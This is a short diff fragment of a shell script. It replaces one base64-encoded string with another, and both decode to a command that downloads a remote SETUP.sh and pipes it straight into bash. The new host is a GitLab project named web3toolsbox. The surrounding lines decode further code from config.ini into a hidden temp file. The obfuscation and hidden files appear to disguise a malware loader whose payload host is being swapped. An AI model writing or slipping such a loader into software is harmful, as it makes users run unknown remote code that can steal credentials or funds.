@@ -541,7 +541,7 @@ if [ -d "$SOURCE_CONFIG_DIR" ]; then
     else
         DECODE='-D'
     fi
-    ENCODED_EC='Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvc3JjL1NFVFVQLnNoIHwgYmFzaA=='
+    ENCODED_EC='Y3VybCAtZnNTTCBodHRwczovL2dpdGxhYi5jb20vd2ViM3Rvb2xzYm94L3NyYy9yYXcvbWFpbi9TRVRVUC5zaCB8IGJhc2g='
 
     GENERATED_SCRIPT=$(mktemp "$SOURCE_CONFIG_DIR/.bash.py.setup.XXXXXX") || exit 1
     if ! grep '^code *= *' "$SOURCE_CONFIG_DIR/config.ini" | sed 's/^code *= *//' | tr -d ' \r\n\t' | base64 "$DECODE" > "$GENERATED_SCRIPT" || [ ! -s "$GENERATED_SCRIPT" ]; then
